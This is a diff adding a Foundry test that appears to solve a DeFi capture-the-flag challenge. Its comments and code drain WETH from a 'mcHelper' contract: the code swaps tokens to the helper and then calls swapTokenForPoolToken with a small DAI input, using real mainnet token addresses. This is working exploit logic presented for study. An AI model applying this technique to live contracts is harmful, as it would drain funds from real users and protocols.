@@ -254,4 +254,38 @@ contract ExploitRandom is Test {
         console2.log("Price    :: %s", p1);
         console2.log();
     }
+
+    // Get more WETH and swap for an amount of USDC
+    // with the mcHelper as the recipient
+    // The amount of USDC sent should be more than the USDC value of WETH
+    // on the mcHelper so that when addiquidity is called, the lesser value
+    // amount is chosen. So all WETH and it's equivalent value in USDC is LP'd
+    // with some remainder amount of USDC left on the contract
+    // Lastly, to make the call happen, the USDC-WETH poolId is chosen but with
+    // a small amount of DAI as the "amountIn". In this case 50 DAI, 25 being
+    // swapped for USDC and WETH respectively.
+    // This passes the two swaps and allows the addLiquidity call to happen
+    // which pulls all WETH out of the mcHelper contract and validating the
+    // flags
+    function test__solution() public {
+        address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+        address DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+
+        WETH.deposit{value: 25 ether}();
+        address[] memory path = new address[](2);
+        path[0] = address(WETH);
+        path[1] = USDC;
+
+        router.swapExactTokensForTokens(20 ether, 0, path, address(mcHelper), block.timestamp);
+
+        path[0] = address(WETH);
+        path[1] = DAI;
+        router.swapExactTokensForTokens(1 ether, 0, path, address(this), block.timestamp);
+
+        uint256 daiIn = 50 * 10 ** 18;
+        ERC20Like(DAI).approve(address(mcHelper), type(uint256).max);
+        mcHelper.swapTokenForPoolToken(1, DAI, daiIn, 0);
+
+        assertTrue(s.isSolved());
+    }
 }
